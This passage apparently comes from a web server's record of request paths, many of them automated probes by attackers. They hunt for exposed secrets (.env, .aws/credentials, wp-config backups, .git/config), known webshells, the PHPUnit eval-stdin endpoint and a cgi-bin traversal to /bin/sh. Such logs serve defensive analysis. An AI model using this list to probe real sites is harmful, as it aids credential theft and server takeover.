GET /plugins/kcfinder/upload.php
GET /pma/
GET /portal/      
GET /predator.php
GET /printenv
GET /printenv.tmp
GET /Priv.php
GET /priv01.php
GET /priv8.php
GET /private/.env
GET /Procfile
GET /prod/.env
GET /product.php
GET /products/.gitlab-ci.yml
GET /profile.php
GET /PSljmXnilpm/photographers.txt
GET /public/_ignition/health-check/
GET /public/.env
GET /public/.git/config
GET /Public/home/js/check.js
GET /public/js/main.js
GET /puki.php
GET /q.php
GET /qa/.git/config
GET /qIVfYMXRYxY/photographers.json
GET /QNTBWtNzVmxWxrc/stations/*
GET /qq.php
GET /qvTnLM/stats
GET /qWkJbBBcqLqJMLM/photographers.txt
GET /QwvS/stations/*
GET /r.php
GET /r00t.php
GET /rad.php
GET /radio.php
GET /RAhy/stats.txt
GET /rCZsQSHRR/stats.txt
GET /README.md
GET /readme.php
GET /remove.php
GET /rename.php
GET /repos/.git/config
GET /repository/.git/config
GET /resources/application.conf
GET /rest.php
GET /rest/.env
GET /results/.env
GET /revisi.php
GET /rex.php
GET /rexx.php
GET /ri.php
GET /rNwGzRBRfk/stats.json
GET /robots.txt
GET /root.php
GET /root/info.php
GET /root/infophp
GET /root/phpinfo.php
GET /rootshell.php
GET /rzCblbQryVIaFPB/stations
GET /s.php
GET /s/3323e2734323e2431323e25383/_/;/META-IN      1 GET /.aws/credentials
GET /sam.php
GET /samba-secrets.tdb
GET /samba.conf
GET /sambernyawa.php
GET /sample-config-options.php
GET /samples/.git/config
GET /sang3.php
GET /sapi/debug/default/view
GET /sbkmyjvm.php?Fox=
GET /scn.php
GET /script/.env
GET /scripts/.env
GET /scripts/filemanager/dialog.php
GET /scripts/index.php
GET /scripts/info.php
GET /scripts/phpinfo
GET /scripts/phpinfo.php
GET /sct.php
GET /secret
GET /secret_key.php
GET /secret_key.py
GET /secret_key.rb
GET /secret_keys
GET /secret.key
GET /secret.txt
GET /secrets.cfg
GET /secrets.cson
GET /secrets.csv
GET /secrets.env
GET /secrets.hjson
GET /secrets.json
GET /secrets.json.enc
GET /secrets.kdbx
GET /secrets.pgp
GET /secrets.xml
GET /secrets.yaml
GET /secured/phpinfo.php
GET /sendgrid.env
GET /server
GET /server-info.php
GET /server-status
GET /server.app
GET /server.cfg
GET /server.js
GET /server.php
GET /server.py
GET /server.rb
GET /server/.env
GET /server/phpinfo.php
GET /server/s3.js
GET /services/.env
GET /settings.cfg
GET /settings.inc.php
GET /settings.ini
GET /settings.json
GET /settings.php
GET /settings.xml
GET /shared/.env
GET /shell_lock.php
GET /shell.php
GET /shell20211028.php
GET /shell4.php
GET /shelss.php
GET /shl.php
GET /shop/.git/config
GET /shop/wp-includes/wlwmanifest.xml
GET /simple.php
GET /site
GET /site/
GET /site/.env
GET /site/.git/config
GET /site/wp-commentin.php
GET /site/wp-includes/wlwmanifest.xml
GET /sitemap_index.xml
GET /sitemap.txt
GET /sitemap.xml
GET /sitemap.xml.gz
GET /sitemaps.xml
GET /sites/default/files/
GET /sito/wp-includes/wlwmanifest.xml
GET /SKQmlwcvKEvfkP/stations.gpx
GET /small.php
GET /smb.conf
GET /SObCGtFX/stats.json
GET /sources/.env
GET /spawn.php
GET /sql.php
GET /src/.env
GET /src/.git/config
GET /src/config.js
GET /src/main/resources/application.properties
GET /src/main/resources/appsettings.yml
GET /src/phpinfo.php
GET /stage2/.env
GET /staging/.env
GET /staging/.git/config
GET /staging2/.env
GET /static../.git/config
GET /static/.env
GET /static/.git/config
GET /static/.gitlab-ci.yml
GET /static/admin/javascript/hetong.js
GET /staticfiles
GET /stations?undefined
GET /stats.php
GET /stats%0A%0A%0A
GET /storage/.env
GET /storage/logs/laravel.log
GET /store/.git/config
GET /string%20value?hasPhoto=&photographer=&maxDistance=&lat=&lon=&active=
GET /style-js.php
GET /style.css
GET /style.php
GET /style.php?sig=
GET /stylec.php
GET /su.php
GET /Switzerland/photographers.json
GET /sx.php
GET /sxfbD/stations/*
GET /syd.php
GET /sym.php
GET /sym403.php
GET /symfony/_profiler/phpinfo
GET /symfony/public/_profiler/phpinfo
GET /symlink.php
GET /sysinfo/tabs/php-info.php
GET /system/.env
GET /system/config/system.yaml
GET /t.php
GET /teamadmin.php
GET /Telerik.Web.UI.WebResource.axd?type=
GET /telescope/requests
GET /temp.php
GET /temp/
GET /tes.php
GET /tesla.php
GET /test
GET /test_404_page/
GET /test_info.php
GET /test_info1.php
GET /test_info2.php
GET /test_info3.php
GET /test_info4.php
GET /test_info5.php
GET /test_phpinfo.php
GET /test_phpinfo1.php
GET /test_phpinfo2.php
GET /test_phpinfo3.php
GET /test_phpinfo4.php
GET /test_phpinfo5.php
GET /test.js
GET /test.php
GET /test.php?Ghost=
GET /test/
GET /test/.env
GET /test/.git/config
GET /test/wp-includes/wlwmanifest.xml
GET /test0.php
GET /test1.php
GET /test123.php
GET /test2.php
GET /test3.php
GET /test4.php
GET /test5.php
GET /test6.php
GET /test7.php
GET /test8.php
GET /test9.php
GET /tester.php
GET /testing.php
GET /testphp.php
GET /testphpinfo
GET /testphpinfo.php
GET /text.php
GET /th3_err0r.php?php=
GET /theme-single.php
GET /themes.php
GET /ticket.php
GET /time.php
GET /tinymce/filemanager/dialog.php
GET /tinymce/plugins/filemanager/dialog.php
GET /tmp/
GET /tmp/phpinfo.php
GET /tnaVdMHCn/stats.json
GET /token.php
GET /tool/view/phpinfo.view.php
GET /tools/info.php
GET /tools/phpinfo
GET /tools/phpinfo.php
GET /tornado.options
GET /TP/public/index.php?function=&s=&vars[0]=&vars[1][]=
GET /twin.php
GET /twitter/.env
GET /tz.php
GET /u.php
GET /uHKFAbYaTogX/stats
GET /up.php
GET /update.php
GET /upgrade.php
GET /upload.js
GET /upload.php
GET /uploads/
GET /uploads/.env
GET /use.php
GET /user-edit.php
GET /user.php
GET /user/.git/config
GET /v.php
GET /v1/.env
GET /v1/.git/config
GET /v2.php
GET /v2/_catalog
GET /v2/.env
GET /v2/.git/config
GET /v2/departures/8400050
GET /v2/departures/8400058
GET /v2/departures/8400170
GET /v2/departures/8400621
GET /v2/departures/8400644
GET /v3.php
GET /v3/.git/config
GET /vendor/.git/config
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
GET /viewinfo.php
GET /VKOUqEMDCdHTBQW/stats
GET /VoJIc/stats.json
GET /vslifiak.php?Fox=
GET /vv.php
GET /w.php
GET /wamGixJTmElG/stats
GET /waYPdnQqb/stations/*
GET /WEB-INF/jetty-env.xml
GET /web.config
GET /web.php
GET /web/
GET /web/.env
GET /web/.git/config
GET /web/debug/default/view
GET /web/wp-includes/wlwmanifest.xml
GET /webdav/info.php
GET /webdav/phpinfo
GET /webdav/phpinfo.php
GET /website/wp-includes/wlwmanifest.xml
GET /well.php
GET /wg.php
GET /whmcs.php
GET /wiki/.git/config
GET /wikindex.php
GET /wikindex.php?f=
GET /wordpress
GET /wordpress/
GET /wordpress/wp-admin/setup-config.php?step=
GET /wordpress/wp-commentin.php
GET /wordpress/wp-config.php
GET /wordpress/wp-includes/wlwmanifest.xml
GET /wordpress/wp-login.php
GET /wp
GET /wp_backup.php
GET /wp_fma.php
GET /wp_mna.php
GET /wp-.myluv.php
GET /wp-1ogin_bak.php
GET /wp-2017.php
GET /wp-2018.php
GET /wp-2019.php
GET /wp-22.php?sfilename=&sfilecontent=&supfiles=
GET /wp-admin.php
GET /wp-admin/
GET /wp-admin/about.php
GET /wp-admin/admin-ajax.php
GET /wp-admin/admin-ajax.php?action=
GET /wp-admin/admin-ajax.php?action=&alg_wc_pif_download_file=
GET /wp-admin/admin-ajax.php?action=&file=
GET /wp-admin/admin-ajax.php?action=&img=
GET /wp-admin/admin.php?page=
GET /wp-admin/config.bak.php
GET /wp-admin/css/
GET /wp-admin/en/widgets/wp-login.php
GET /wp-admin/images/admin.php
GET /wp-admin/includes/class-wp-media-list-data.php
GET /wp-admin/install.php
GET /wp-admin/js/about.php7
GET /wp-admin/js/widgets/wp-login.php
GET /wp-admin/maint/atomlib.php
GET /wp-admin/network/admin.php
GET /wp-admin/network/index.php
GET /wp-admin/setup-config.php?step=
GET /wp-admin/style.php?sig=
GET /wp-admin/user/about.php
GET /wp-admin/xleet.php
GET /wp-aespa.php
GET /wp-blog.php
GET /wp-booking.php
GET /wp-cc.php
GET /wp-class.php
GET /wp-clon.php
GET /wp-commentin.php
GET /wp-config_bak2.php
GET /wp-config-sample.inc.php
GET /wp-config-sample.json
GET /wp-config-sample.php
GET /wp-config-sample.xml
GET /wp-config-samsples.php
GET /wp-config.backup
GET /wp-config.bak
GET /wp-config.BAK
GET /wp-config.default
GET /wp-config.good
GET /wp-config.inc
GET /wp-config.inc.php
GET /wp-config.json
GET /wp-config.orig
GET /wp-config.php
GET /wp-config.php_
GET /wp-config.php_backup
GET /wp-config.php_bak
GET /wp-config.php_bak2
GET /wp-config.php_bk
GET /wp-config.php_old
GET /wp-config.php_orig
GET /wp-config.php-backup
GET /wp-config.php-bak
GET /wp-config.php.
GET /wp-config.php.600
GET /wp-config.php.back
GET /wp-config.php.backup
GET /wp-config.php.bak
GET /wp-config.php.BAK
GET /wp-config.php.bk
GET /wp-config.php.default
GET /wp-config.php.new
GET /wp-config.php.old
GET /wp-config.php.orig
GET /wp-config.php.original
GET /wp-config.php.save
GET /wp-config.php.savin
GET /wp-config.php.swo
GET /wp-config.php.swp
GET /wp-config.php.tmp
GET /wp-config.php~
GET /wp-config.sample
GET /wp-config.sample.bak
GET /wp-config.sample.php
GET /wp-config.xml
GET /wp-contact.php
GET /wp-content/
GET /wp-content/.git/config
GET /wp-content/about.php
GET /wp-content/class-index-wordpress.php
GET /wp-content/config.bak.php
GET /wp-content/db_cache.php
GET /wp-content/install.php
GET /wp-content/king.php
GET /wp-content/langar.php
GET /wp-content/mu-plugins-old/index.php?f=
GET /wp-content/mu-plugins/db-safe-mode.php
GET /wp-content/plugins/.git/config
GET /wp-content/plugins/advanced-import/readme.txt
GET /wp-content/plugins/ait-csv-import-export/changelog.txt
GET /wp-content/plugins/all-in-one-video-gallery/readme.txt
GET /wp-content/plugins/alphabetic-pagination/readme.txt
GET /wp-content/plugins/angwp/__%20UPDATES.txt
GET /wp-content/plugins/apikey/a57bze8931.php
GET /wp-content/plugins/apikey/apikey.php
GET /wp-content/plugins/apikey/apikey.php?test=
GET /wp-content/plugins/apikey/apikey.php.suspected?test=
GET /wp-content/plugins/armember-membership/readme.txt
GET /wp-content/plugins/backup_index.php
GET /wp-content/plugins/backup-backup/admin/css/bmi-plugin.min.css
GET /wp-content/plugins/capabilities-pro/readme.txt
GET /wp-content/plugins/capability-manager-enhanced/readme.txt
GET /wp-content/plugins/cherry-plugin/admin/import-export/a57bze8931.php
GET /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=
GET /wp-content/plugins/cherry-plugin/admin/import-export/upload.php
GET /wp-content/plugins/config.bak.php
GET /wp-content/plugins/core-engine/index.php
GET /wp-content/plugins/directorist/readme.txt
GET /wp-content/plugins/dzs-zoomsounds/a57bze8931.php
GET /wp-content/plugins/dzs-zoomsounds/admin/admin.css
GET /wp-content/plugins/dzs-zoomsounds/en.php?location=
GET /wp-content/plugins/e-signature/page-template/default/style.css
GET /wp-content/plugins/elementor-pro/assets/css/preview.css
GET /wp-content/plugins/emails-verification-for-woocommerce/readme.txt
GET /wp-content/plugins/essential-addons-for-elementor-lite/assets/admin/css/cloud.css
GET /wp-content/plugins/essential-blocks/assets/css/react-select.min.css
GET /wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
GET /wp-content/plugins/fix/up.php
GET /wp-content/plugins/formcraft/file-upload/server/php/
GET /wp-content/plugins/formcraft/file-upload/server/php/files/a57bze8931.php
GET /wp-content/plugins/ht-mega-for-elementor/assets/css/htbbootstrap.css
GET /wp-content/plugins/image-hover-effects-ultimate/readme.txt
GET /wp-content/plugins/indeed-membership-pro/classes/PaymentGateways/mollie/vendor/phpunit/phpunit/phpunit.xsd
GET /wp-content/plugins/index.php
GET /wp-content/plugins/ioptimization/a57bze8931.php
GET /wp-content/plugins/ioptimization/IOptimize.php?rchk
GET /wp-content/plugins/ioptimizations/a57bze8931.php
GET /wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd
GET /wp-content/plugins/iwp-client/readme.txt
GET /wp-content/plugins/mapsvg-lite-interactive-vector-maps/gm_download.php?file=
GET /wp-content/plugins/mapsvg/gm_download.php?file=
GET /wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt
GET /wp-content/plugins/mstore-api/assets/js/mstore-inspireui.js
GET /wp-content/plugins/mstore-api/readme.txt
GET /wp-content/plugins/mw-wp-form/css/admin-common.css
GET /wp-content/plugins/nd-booking/readme.txt
GET /wp-content/plugins/nd-donations/readme.txt
GET /wp-content/plugins/nd-learning/readme.txt
GET /wp-content/plugins/nd-restaurant-reservations/readme.txt
GET /wp-content/plugins/nd-shortcodes/readme.txt
GET /wp-content/plugins/ninja-forms/readme.txt
GET /wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=
GET /wp-content/plugins/quiz-master-next/readme.txt
GET /wp-content/plugins/royal-elementor-addons/assets/css/frontend.min.css
GET /wp-content/plugins/royal-elementor-addons/assets/js/modal-popups.min.js
GET /wp-content/plugins/scripts-organizer/plugins/meta-box/readme.txt
GET /wp-content/plugins/shortcode-addons/readme.txt
GET /wp-content/plugins/simply-schedule-appointments/readme.txt
GET /wp-content/plugins/sitemap-by-click5/readme.txt
GET /wp-content/plugins/super-interactive-maps/css/sim-wp-admin.css
GET /wp-content/plugins/superlogoshowcase-wp/css/sls-wp-admin.css
GET /wp-content/plugins/superstorefinder-wp/css/ssf-wp-admin.css
GET /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php
GET /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/abruzi.php
GET /wp-content/plugins/t_file_wp/t_file_wp.php?test=
GET /wp-content/plugins/tatsu/changelog.md
GET /wp-content/plugins/td-cloud-library/assets/css/tdb_wp_admin_taxonomies.css
GET /wp-content/plugins/themegrill-demo-importer/readme.txt
GET /wp-content/plugins/ubh/up.php
GET /wp-content/plugins/udraw/readme.txt
GET /wp-content/plugins/ulisting/readme.txt
GET /wp-content/plugins/ultimate-member/readme.txt
GET /wp-content/plugins/vc-tabs/readme.txt
GET /wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=
GET /wp-content/plugins/woo-product-table/readme.txt
GET /wp-content/plugins/woocommerce-jetpack/readme.txt
GET /wp-content/plugins/woocommerce-payments/dist/blocks-checkout.css
GET /wp-content/plugins/woocommerce-upload-files/*/wcuf-admin-menu.js
GET /wp-content/plugins/woocommerce/assets/fonts/WooCommerce.woff
GET /wp-content/plugins/wp-automatic/changelog
GET /wp-content/plugins/wp-automatic/css/wp-automatic.css
GET /wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=
GET /wp-content/plugins/wp-engine-module/a57bze8931.php
GET /wp-content/plugins/wp-engine-module/wp-engine.php
GET /wp-content/plugins/wp-fastest-cache/readme.txt
GET /wp-content/plugins/wp-file-manager-pro/css/fm_common.css
GET /wp-content/plugins/wp-file-manager-pro/lib/php/connector.minimal.php
GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
GET /wp-content/plugins/wp-file-manager/readme.txt
GET /wp-content/plugins/wp-gdpr-compliance/Assets/js/front.min.js.LICENSE.txt
GET /wp-content/plugins/wp-live-chat-support-pro/css/wplc_styles_pro.css
GET /wp-content/plugins/wp-pinterest-automatic/changelog
GET /wp-content/plugins/wp-post-author/assets/css/awpa-frontend-style.css
GET /wp-content/plugins/wp-time-capsule/readme.txt
GET /wp-content/plugins/wp-user-avatar/changelog.txt
GET /wp-content/plugins/wp-user-extra-fields/en/wpuef-configurator.js
GET /wp-content/plugins/wpcargo/includes/barcode.php?text=&sizefactor=&size=&filepath=
GET /wp-content/plugins/wpcargo/readme.txt
GET /wp-content/plugins/wpconfig.bak.php?act=
GET /wp-content/plugins/wpdiscuz/themes/default/style-rtl.css
GET /wp-content/plugins/wpgateway/css/style.css
GET /wp-content/themes/.git/config
GET /wp-content/themes/bricks/style.css
GET /wp-content/themes/config.bak.php
GET /wp-content/themes/greyd_suite/style.css
GET /wp-content/themes/seotheme/db.php?u
GET /wp-content/themes/seotheme/mar.php
GET /wp-content/themes/twentyfive/include.php
GET /wp-content/themes/twentytwentythree/patterns/index.php
GET /wp-content/themes/workreap/style.css
GET /wp-content/uploads/html2wp/abruzi.php
GET /wp-content/uploads/index.php
GET /wp-content/uploads/kaswara/fonts_icon/a57bze8931/.__a57bze8931.php
GET /wp-content/uploads/typehub/custom/a57bze8931/.__a57bze8931.php
GET /wp-content/uploads/wp_live_chat/abruzi.php
GET /wp-content/uploads/wp-login.php
GET /wp-content/uploads/wpr-addons/forms/b1ack.php
GET /wp-content/wp-1ogin_bak.php
GET /wp-content/wp-old-index.php?action=&pass=&submit=
GET /wp-content/x.php?1=
GET /wp-content/xleet.php
GET /wp-defaul.php
GET /wp-del.php
GET /wp-edit.php
GET /wp-editor.php
GET /wp-file.php
GET /wp-files.php
GET /wp-functions.php
GET /wp-god.php
GET /wp-includes/class-index-wordpress.php
GET /wp-includes/class-wordpress-license.php
GET /wp-includes/class-wp-page-icon.php
GET /wp-includes/config.bak.php
GET /wp-includes/css/buttons.css
GET /wp-includes/css/css.php
GET /wp-includes/en/jquery/jquery.js
GET /wp-includes/fonts/css.php
GET /wp-includes/ID3/license.txt
GET /wp-includes/install.php
GET /wp-includes/js/.git/config
GET /wp-includes/js/jquery/jquery.js
GET /wp-includes/lfx.php
GET /wp-includes/pomo/umpomone.php
GET /wp-includes/shell20211028.php
GET /wp-includes/small.php
GET /wp-includes/Text/about.php
GET /wp-includes/wlwmanifest.xml
GET /wp-includes/wp-system-cloud.php
GET /wp-includes/wpconfig.bak.php?act=
GET /wp-includes/xleet.php
GET /wp-info.php
GET /wp-init.php
GET /wp-json/wp_live_chat_support/en/remote_upload
GET /wp-login.php
GET /wp-mailcek.php
GET /wp-mails.ph
GET /wp-menu.php
GET /wp-one.php
GET /wp-pano
GET /wp-pano.php
GET /wp-pluging.php
GET /wp-plugins.php
GET /wp-raze.php
GET /wp-root.php
GET /wp-rss.php
GET /wp-site.php
GET /wp-smail.php
GET /wp-system.php
GET /wp-title.php
GET /wp-update.php
GET /wp-user.php
GET /wp-users.php
GET /wp-ver.php
GET /wp-we.php
GET /wp.php
GET /wp/
GET /wp/wp-includes/wlwmanifest.xml
GET /wp/wp-login.php
GET /wp1/wp-includes/wlwmanifest.xml
GET /wp2/wp-includes/wlwmanifest.xml
GET /wpindex.php
GET /wpindex.php?idb=
GET /ws.php
GET /wso.php
GET /wso1337.php
GET /wso2023.php
GET /wsoshell.php
GET /www/.env
GET /wXkE/stations/*
GET /wxOCBtXICmYLRmex/stats
GET /x.php
GET /xdoor.php
GET /xleet-shell.php
GET /xleet.php
GET /xlet.php
GET /xmlrp.php?url=
GET /xmlrpc.php
GET /xmlrpc.php?rsd
GET /xmrlpc.php
GET /xooacRVvsNbn/photographers.json
GET /xzd.php
GET /xzdd.php
GET /y.php
GET /ye.php
GET /YtWiHyKJ/stats.json
GET /yuki.php
GET /yuuki.php
GET /yuuki2.php
GET /z.php
GET /zaco.php
GET /zec.php
GET /ZqoLewi/photographers
GET /zz.php
GET /zzz.php

HEAD /.ftpconfig
HEAD /.vscode/sftp.json
HEAD /)
HEAD /age-de.xml
HEAD /age.xml
HEAD /backup
HEAD /bc
HEAD /bk
HEAD /home
HEAD /https:/api.railway-stations.org/
HEAD /main
HEAD /new
HEAD /old
HEAD /password.txt
HEAD /passwords.txt
HEAD /raedhfhf000000.cfg
HEAD /wordpress
HEAD /wp

POST /
POST /.env
POST /.env.development
POST /.env.dist
POST /.env.old
POST /.env.prod
POST /.env.production
POST /.env.project
POST /.env.save
POST /admin-app/.env
POST /ALFA_DATA/alfacgiapi/perl.alfa
POST /alfacgiapi/perl.alfa      
POST /api/.env
POST /app/.env
POST /application/.env
POST /apps/.env
POST /back/.env
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
POST /cms/.env
POST /core/.env
POST /cp/.env
POST /development/.env
POST /docker/.env
POST /enviroments/.env
POST /enviroments/.env.production
POST /fedex/.env
POST /laravel/.env
POST /live_env
POST /local/.env
POST /login/xmlrpc.php
POST /modules/jmsslider/ajax_jmsslider.php?action=&id_slide=&data_type=
POST /modules/smartprestashopthemeadmin/ajax_smartprestashopthemeadmin.php
POST /private/.env
POST /rest/.env
POST /script/.env
POST /shared/.env
POST /sources/.env
POST /system/.env
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
POST /wp-admin/admin-ajax.php
POST /wp-admin/admin-ajax.php?action=
POST /wp-admin/admin.php?page=
POST /wp-content/plugins/apikey/apikey.php
POST /wp-content/plugins/cherry-plugin/admin/import-export/upload.php
POST /wp-content/plugins/dzs-zoomsounds/en.php?location=
POST /wp-content/plugins/formcraft/file-upload/server/php/
POST /wp-content/plugins/ioptimization/IOptimize.php?rchk
POST /wp-content/plugins/ioptimizations/IOptimizes.php?hamlorszd
POST /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php
POST /wp-content/plugins/wp-engine-module/wp-engine.php
POST /wp-content/x.php?1=
POST /wp-includes/css/wp-config.php
POST /wp-json/wp_live_chat_support/*/remote_upload
POST /wp-plain.php
POST /xmlrpc.php

PUT /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
PUT /api/en/cmdb/system/admin/admin
PUT /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
PUT /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
PUT /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
PUT /wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php